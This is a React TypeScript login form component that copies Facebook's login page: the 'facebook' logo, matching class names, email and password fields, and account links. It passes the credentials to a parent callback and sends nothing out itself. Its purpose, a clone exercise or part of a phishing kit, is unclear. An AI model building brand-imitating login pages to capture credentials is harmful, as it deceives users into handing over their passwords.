import { useState } from 'react';
import '../index.css';

interface LoginFormProps {
  onSubmit: (email: string, password: string) => void;
  isLoading: boolean;
}

export function LoginForm({ onSubmit, isLoading }: LoginFormProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="fb-login">
      <div className="fb-header">
        <h1 className="fb-logo">facebook</h1>
      </div>
      <div className="login-form-container">
        <form onSubmit={handleSubmit} className="fb-form">
          <div className="form-group">
            <input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="fb-input"
            />
          </div>
          <div className="form-group">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="fb-input"
            />
          </div>
          <div className="form-group">
            <button type="submit" className="fb-button" disabled={isLoading}>
              {isLoading ? 'Logging in...' : 'Log In'}
            </button>
          </div>
          <div className="forgot-password">
            <a href="#forgot">Forgotten password?</a>
          </div>
          <div className="divider">
            <span>or</span>
          </div>
          <div className="form-group">
            <button type="button" className="create-account-button">
              Create New Account
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}